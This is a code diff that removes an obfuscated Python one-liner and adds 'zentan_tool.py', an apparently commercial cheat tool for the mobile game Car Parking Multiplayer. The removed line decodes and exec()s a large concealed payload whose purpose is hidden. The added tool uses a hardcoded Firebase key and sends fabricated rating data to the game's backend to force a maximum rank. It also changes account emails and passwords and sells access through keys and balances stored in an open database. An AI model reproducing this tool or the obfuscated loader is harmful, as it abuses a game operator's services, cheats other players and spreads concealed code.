@@ -1,1 +1,510 @@
-_ = lambda x: __import__('zlib').decompress(__import__('base64').b64decode(x[::-1]));exec((_)(b'=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'))
+# zentan_tool.py
+import getpass
+import re
+import sys
+import os
+import json
+import time
+import requests
+from rich.console import Console
+
+c = Console()
+
+# ═══════════════════════════════════════════════
+#  🔑 CONFIG
+# ═══════════════════════════════════════════════
+
+API_KEY = os.getenv("CPM_FIREBASE_KEY", "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA")
+
+SIGN_IN_URL = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
+SIGN_UP_URL = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}"
+UPDATE_URL  = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={API_KEY}"
+
+RANK_URL = os.getenv(
+    "CPM_RANK_URL",
+    "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating6",
+)
+
+FIREBASE_URL = os.getenv(
+    "CPM_FIREBASE_URL",
+    "https://kayzen-1ff37-default-rtdb.firebaseio.com/users",
+)
+
+CHANNEL = "ZentanShopChannel"
+CHAT    = "ZentanShopChat"
+
+# Service prices (matching menu option numbers)
+PRICES = {
+    1: 10000,   # change email
+    2: 5000,    # change password
+    3: 9000,    # set rank
+    4: 2000,    # register from new account
+}
+
+GAME_HEADERS = {
+    "Accept": "*/*",
+    "Accept-Encoding": "gzip",
+    "Content-Type": "application/json",
+    "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
+    "X-Unity-Version": "2022.3.62f2",
+}
+
+# ═══════════════════════════════════════════════
+#  🎨 COLORS
+# ═══════════════════════════════════════════════
+
+class Colors:
+    RED     = '\033[91m'
+    GREEN   = '\033[92m'
+    YELLOW  = '\033[93m'
+    BLUE    = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN    = '\033[96m'
+    WHITE   = '\033[97m'
+    RESET   = '\033[0m'
+    BOLD    = '\033[1m'
+
+def color_text(text, color):
+    return f"{color}{text}{Colors.RESET}"
+
+def horizontal_colors(text):
+    result = ""
+    colors = [Colors.RED, Colors.GREEN, Colors.YELLOW, Colors.BLUE, Colors.MAGENTA, Colors.CYAN]
+    for i, char in enumerate(text):
+        result += f"{colors[i % len(colors)]}{char}{Colors.RESET}"
+    return result
+
+def is_email(e):
+    return re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", e) is not None
+
+def clear():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+# ═══════════════════════════════════════════════
+#  🔐 FIREBASE AUTH
+# ═══════════════════════════════════════════════
+
+def sign_in(email, password):
+    try:
+        r = requests.post(
+            SIGN_IN_URL,
+            json={"email": email, "password": password, "returnSecureToken": True},
+            timeout=10,
+        )
+        data = r.json()
+        if r.status_code == 200:
+            return data.get("idToken"), data.get("email", email)
+        c.print(f"[bold red]Error:[/bold red] {data.get('error', {}).get('message', 'Auth failed')}")
+    except Exception as e:
+        c.print(f"[bold red]Net error:[/bold red] {e}")
+    return None, None
+
+def sign_up(email, password):
+    """Create a new Firebase account. Returns (idToken, email, localId) or (None,None,None)."""
+    try:
+        r = requests.post(
+            SIGN_UP_URL,
+            json={"email": email, "password": password, "returnSecureToken": True},
+            timeout=10,
+        )
+        data = r.json()
+        if r.status_code == 200:
+            c.print("[bold green][✓] Account created successfully![/bold green]")
+            return data.get("idToken"), data.get("email", email), data.get("localId")
+        err = data.get('error', {}).get('message', 'Signup failed')
+        friendly = {
+            "EMAIL_EXISTS":          "This email is already registered.",
+            "OPERATION_NOT_ALLOWED": "Email/password sign-up is disabled in Firebase Console.",
+            "WEAK_PASSWORD":         "Password is too weak (min 6 chars).",
+            "INVALID_EMAIL":         "Invalid email address.",
+            "TOO_MANY_ATTEMPTS_TRY_LATER": "Too many attempts. Try again later.",
+        }.get(err, err)
+        c.print(f"[bold red]Error:[/bold red] {friendly}")
+    except Exception as e:
+        c.print(f"[bold red]Net error:[/bold red] {e}")
+    return None, None, None
+
+def update_email(token, new_email):
+    try:
+        r = requests.post(
+            UPDATE_URL,
+            json={"idToken": token, "email": new_email, "returnSecureToken": True},
+            timeout=10,
+        )
+        data = r.json()
+        if r.status_code == 200:
+            c.print("[bold green]Email updated successfully![/bold green]")
+            return True, data.get("idToken", token), data.get("email", new_email)
+        error_msg = data.get('error', {}).get('message', 'Update failed')
+        c.print(f"[bold red]Error:[/bold red] {error_msg}")
+    except Exception as e:
+        c.print(f"[bold red]Net error:[/bold red] {e}")
+    return False, token, None
+
+def update_password(token, new_password):
+    try:
+        r = requests.post(
+            UPDATE_URL,
+            json={"idToken": token, "password": new_password, "returnSecureToken": True},
+            timeout=10,
+        )
+        data = r.json()
+        if r.status_code == 200:
+            c.print("[bold green]Password updated successfully![/bold green]")
+            return True, data.get("idToken", token), None
+        error_msg = data.get('error', {}).get('message', 'Update failed')
+        c.print(f"[bold red]Error:[/bold red] {error_msg}")
+    except Exception as e:
+        c.print(f"[bold red]Net error:[/bold red] {e}")
+    return False, token, None
+
+# ═══════════════════════════════════════════════
+#  🏆 SET RANK
+# ═══════════════════════════════════════════════
+
+def set_rank(auth_token):
+    rating_data = {
+        "RatingData": {
+            "time": 1e22, "cars": 1e16, "car_fix": 1e13, "car_collided": 1e12,
+            "car_exchange": 1e13, "car_trade": 1e13, "car_wash": 1e13,
+            "slicer_cut": 1e13, "drift_max": 1e14, "drift": 1e14,
+            "cargo": 1e5, "delivery": 1e5, "race_win": 3e20,
+            "taxi": 1e10, "levels": 10000990000, "gifts": 1e9,
+            "fuel": 1e10, "offroad": 1e10, "speed_banner": 1e9,
+            "reactions": 1e17, "run": 1e9, "real_estate": 1e9,
+            "t_distance": 1e10, "treasure": 1e10, "block_post": 1e10,
+            "push_ups": 1e12, "burnt_tire": 1e10, "passanger_distance": 1e8,
+        }
+    }
+    try:
+        r = requests.post(
+            RANK_URL,
+            json={"data": json.dumps(rating_data)},
+            headers={**GAME_HEADERS, "Authorization": f"Bearer {auth_token}"},
+            timeout=15,
+        )
+        if r.status_code == 200:
+            c.print("[bold green][✓] Rank set successfully![/bold green]")
+            return True
+        c.print(f"[bold red][!] Rank failed: HTTP {r.status_code} — {r.text[:120]}[/bold red]")
+    except Exception as e:
+        c.print(f"[bold red][!] Rank net error: {e}[/bold red]")
+    return False
+
+# ═══════════════════════════════════════════════
+#  🌐 LOCATION & FIREBASE
+# ═══════════════════════════════════════════════
+
+def get_location():
+    try:
+        response = requests.get("http://ip-api.com/json", timeout=10)
+        return response.json()
+    except Exception:
+        return None
+
+def get_firebase_data():
+    try:
+        response = requests.get(f"{FIREBASE_URL}.json", timeout=10)
+        return response.json() or {}
+    except Exception:
+        return {}
+
+def verify_access_key(access_key):
+    db = get_firebase_data()
+    for uid, user_data in db.items():
+        if isinstance(user_data, dict):
+            user_key = user_data.get('key')
+            if user_key is not None and str(user_key) == str(access_key):
+                if user_data.get('is_blocked') is True:
+                    return None, None, None, None, True
+                is_unlimited = user_data.get('is_unlimited', False)
+                balance = 999999 if is_unlimited else user_data.get('balance', 0)
+                if not isinstance(balance, (int, float)):
+                    balance = 0
+                tg_id = user_data.get('telegram_id', 'Unknown')
+                if tg_id == 'Unknown' or tg_id is None:
+                    tg_id = 'Not Linked'
+                return uid, tg_id, balance, is_unlimited, False
+    return None, None, None, None, False
+
+def update_balance(user_ref, new_balance):
+    try:
+        r = requests.patch(f"{FIREBASE_URL}/{user_ref}.json",
+                           json={"balance": int(new_balance)}, timeout=10)
+        return r.status_code == 200
+    except Exception:
+        return False
+
+# ═══════════════════════════════════════════════
+#  🖼️  BANNER & INFO
+# ═══════════════════════════════════════════════
+
+def banner():
+    clear()
+    print(horizontal_colors("=" * 60))
+    print(horizontal_colors("Car Parking Multiplayer 1 Tool".center(60)))
+    print(horizontal_colors("=" * 60))
+    print(color_text("\n          PLEASE LOGOUT FROM CPM BEFORE USING THIS TOOL", Colors.YELLOW))
+    print(color_text("    SHARING THE ACCESS KEY IS NOT ALLOWED AND WILL BE BLOCKED", Colors.RED))
+    print(color_text(f"           Telegram: @{CHANNEL} or @{CHAT}", Colors.CYAN))
+    print(horizontal_colors("=" * 60))
+
+def show_info(email, access_key, tg_id, balance, is_unlimited, location):
+    print(color_text("\n========[ PLAYER DETAILS ]========", Colors.CYAN))
+    print(color_text(f">> Email        : {email}", Colors.GREEN))
+    print(color_text(">> Name         : Player", Colors.GREEN))
+    print(color_text(">> LocalID      : DEFAULT_ID", Colors.GREEN))
+    print(color_text(">> Moneys       : 50,000,000", Colors.GREEN))
+    print(color_text(">> Coins        : 500,000", Colors.GREEN))
+    print(color_text(">> Car Count    : 250", Colors.GREEN))
+    print(color_text(">> Friend count : 20", Colors.GREEN))
+
+    print(color_text("\n========[ ACCESS KEY DETAILS ]========", Colors.CYAN))
+    print(color_text(f">> Access Key  : {access_key}", Colors.YELLOW))
+    print(color_text(f">> Telegram ID : {tg_id}", Colors.YELLOW))
+
+    if is_unlimited:
+        print(color_text(">> Balance     : Unlimited", Colors.MAGENTA))
+    else:
+        print(color_text(f">> Balance     : {balance:,}", Colors.MAGENTA))
+
+    if location:
+        print(color_text("\n========[ LOCATION ]========", Colors.CYAN))
+        print(color_text(f">> IP Address : {location.get('query', 'Unknown')}", Colors.BLUE))
+        print(color_text(f">> Location   : {location.get('city','')} {location.get('regionName','')} {location.get('countryCode','')}", Colors.BLUE))
+        print(color_text(f">> Country    : {location.get('country','')} {location.get('zip','')}", Colors.BLUE))
+
+    print(color_text("\n========[ MENU ]========", Colors.CYAN))
+    print(color_text("(1): Change email                10K", Colors.GREEN))
+    print(color_text("(2): Change password              5K", Colors.GREEN))
+    print(color_text("(3): Set rank                     9K", Colors.GREEN))
+    print(color_text("(4): Register from new account    2K", Colors.GREEN))
+    print(color_text("(5): Back to home",                   Colors.YELLOW))
+    print(color_text("(0): Exit out from tool",             Colors.RED))
+    print(horizontal_colors("\n========[ ZentanShop ]========"))
+
+def farewell():
+    print(color_text("\n\n✨ THANK YOU FOR USING ZENTANSHOP ✨", Colors.GREEN))
+    print(color_text("━━━━━━━━━━━━━━━━━━━━━━━━━━━━", Colors.CYAN))
+    print(color_text(f"📢 Join us: @{CHANNEL}", Colors.CYAN))
+    print(color_text(f"💬 Community: @{CHAT}", Colors.CYAN))
+    print(color_text("━━━━━━━━━━━━━━━━━━━━━━━━━━━━", Colors.CYAN))
+    print(color_text("🚀 Keep growing. Keep creating.", Colors.YELLOW))
+    print(color_text("👋 See you next time, Boss!", Colors.GREEN))
+    time.sleep(2)
+    sys.exit()
+
+# ═══════════════════════════════════════════════
+#  🆕 REGISTER NEW ACCOUNT (used inside menu)
+# ═══════════════════════════════════════════════
+
+def register_flow():
+    """Create a new CPM account. Credit is charged by the caller."""
+    print(color_text("\n========[ REGISTER NEW ACCOUNT ]========", Colors.CYAN))
+
+    email = input(color_text("\n[?] New Email: ", Colors.CYAN)).strip()
+    if not is_email(email):
+        print(color_text("[!] Invalid email format!", Colors.RED))
+        time.sleep(2)
+        return False
+
+    password = getpass.getpass(color_text("[?] New Password (min 6 chars): ", Colors.CYAN))
+    if len(password) < 6:
+        print(color_text("[!] Password must be at least 6 characters!", Colors.RED))
+        time.sleep(2)
+        return False
+
+    confirm = getpass.getpass(color_text("[?] Confirm Password: ", Colors.CYAN))
+    if password != confirm:
+        print(color_text("[!] Passwords don't match!", Colors.RED))
+        time.sleep(2)
+        return False
+
+    print(color_text("\n[*] Creating account...", Colors.YELLOW))
+    token, new_email, uid = sign_up(email, password)
+    if not token:
+        time.sleep(2)
+        return False
+
+    print(color_text(f"\n[✓] Account ready: {new_email}", Colors.GREEN))
+    print(color_text(f"[i] Firebase UID: {uid}", Colors.CYAN))
+    time.sleep(2)
+    return True
+
+# ═══════════════════════════════════════════════
+#  🎯 MAIN
+# ═══════════════════════════════════════════════
+
+def main():
+    while True:
+        banner()
+
+        email      = input(color_text("\n[?] Account Email: ", Colors.CYAN)).strip()
+        password   = getpass.getpass(color_text("[?] Account Password: ", Colors.CYAN))
+        access_key = input(color_text("[?] Access key: ", Colors.CYAN)).strip()
+
+        if not is_email(email):
+            print(color_text("[!] Invalid email format!", Colors.RED))
+            time.sleep(2)
+            continue
+
+        if len(password) < 6:
+            print(color_text("[!] Password must be at least 6 characters!", Colors.RED))
+            time.sleep(2)
+            continue
+
+        print(color_text("\n[*] Trying to Login...", Colors.YELLOW))
+        time.sleep(1)
+
+        user_ref, tg_id, balance, is_unlimited, is_blocked = verify_access_key(access_key)
+
+        if is_blocked:
+            print(color_text("[!] TRY AGAIN.", Colors.RED))
+            print(color_text("[!] Note: This access key is blocked!", Colors.YELLOW))
+            time.sleep(3)
+            continue
+
+        if user_ref is None:
+            print(color_text("[!] TRY AGAIN.", Colors.RED))
+            print(color_text("[!] Note: make sure you filled out the fields correctly!", Colors.YELLOW))
+            time.sleep(3)
+            continue
+
+        token, cur_email = sign_in(email, password)
+        if not token:
+            print(color_text("[%] Trying to Login: TRY AGAIN. Note: make sure you filled out the fields correctly!", Colors.RED))
+            time.sleep(2)
+            continue
+
+        print(color_text("[%] Trying to Login: SUCCESSFUL", Colors.GREEN))
+        time.sleep(1)
+
+        # ═══════════════════════════════════
+        #  INNER MENU LOOP
+        # ═══════════════════════════════════
+        back_to_launcher = False
+
+        while True:
+            location = get_location()
+            banner()
+
+            if not is_unlimited and user_ref:
+                db = get_firebase_data()
+                node = db.get(user_ref, {}) if isinstance(db, dict) else {}
+                try:
+                    balance = int(node.get('balance', balance))
+                except Exception:
+                    pass
+
+            show_info(cur_email, access_key, tg_id, balance, is_unlimited, location)
+
+            try:
+                choice = int(input(color_text("\n[?] Select a Service [0-5]: ", Colors.CYAN)))
+            except Exception:
+                choice = -1
+
+            # ─── EXIT (0) ─────────────────────
+            if choice == 0:
+                answ = input(color_text("\n[?] DO YOU WANT TO EXIT? (y/n): ", Colors.CYAN)).lower()
+                if answ == "y":
+                    farewell()
+                else:
+                    continue
+
+            # ─── BACK TO HOME (5) ─────────────
+            if choice == 5:
+                print(color_text("\n[←] Returning to Main Menu...", Colors.YELLOW))
+                time.sleep(1)
+                back_to_launcher = True
+                break
+
+            # ─── VALIDATION ───────────────────
+            if choice not in (1, 2, 3, 4):
+                print(color_text("INVALID CHOICE!", Colors.RED))
+                time.sleep(1)
+                continue
+
+            cost = PRICES.get(choice, 0)
+
+            # ─── BALANCE CHECK ────────────────
+            if not is_unlimited and balance < cost:
+                print(color_text(f"\nINSUFFICIENT BALANCE! Need {cost:,}", Colors.RED))
+                print(color_text(f"Your balance: {balance:,}", Colors.YELLOW))
+                time.sleep(2)
+                continue
+
+            # ─── SERVICE 1: CHANGE EMAIL ─────
+            if choice == 1:
+                new_email = input(color_text("[?] New email: ", Colors.CYAN)).strip()
+                if not is_email(new_email):
+                    print(color_text("[!] Invalid email format!", Colors.RED))
+                    time.sleep(2)
+                    continue
+
+                confirm_email = input(color_text("[?] Confirm email: ", Colors.CYAN)).strip()
+                if new_email != confirm_email:
+                    print(color_text("[!] Emails don't match!", Colors.RED))
+                    time.sleep(2)
+                    continue
+
+                ok, token, updated_email = update_email(token, new_email)
+                if ok and updated_email:
+                    cur_email = updated_email
+                    if not is_unlimited:
+                        balance -= cost
+                        update_balance(user_ref, balance)
+                    print(color_text("[✓] Email changed successfully!", Colors.GREEN))
+                time.sleep(2)
+
+            # ─── SERVICE 2: CHANGE PASSWORD ──
+            elif choice == 2:
+                new_password = getpass.getpass(color_text("[?] New password: ", Colors.CYAN))
+                if len(new_password) < 6:
+                    print(color_text("[!] Password must be at least 6 characters!", Colors.RED))
+                    time.sleep(2)
+                    continue
+
+                confirm_password = getpass.getpass(color_text("[?] Confirm password: ", Colors.CYAN))
+                if new_password != confirm_password:
+                    print(color_text("[!] Passwords don't match!", Colors.RED))
+                    time.sleep(2)
+                    continue
+
+                ok, token, _ = update_password(token, new_password)
+                if ok:
+                    if not is_unlimited:
+                        balance -= cost
+                        update_balance(user_ref, balance)
+                    print(color_text("[✓] Password changed successfully!", Colors.GREEN))
+                time.sleep(2)
+
+            # ─── SERVICE 3: SET RANK ─────────
+            elif choice == 3:
+                print(color_text("[*] Applying max rank...", Colors.YELLOW))
+                ok = set_rank(token)
+                if ok:
+                    if not is_unlimited:
+                        balance -= cost
+                        update_balance(user_ref, balance)
+                time.sleep(2)
+
+            # ─── SERVICE 4: REGISTER NEW ACCOUNT ─
+            elif choice == 4:
+                ok = register_flow()
+                if ok:
+                    if not is_unlimited:
+                        balance -= cost
+                        update_balance(user_ref, balance)
+                    print(color_text(f"[✓] {cost:,} credit deducted. Balance: {balance:,}", Colors.GREEN))
+                time.sleep(2)
+
+        if back_to_launcher:
+            continue
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print()
+        farewell()
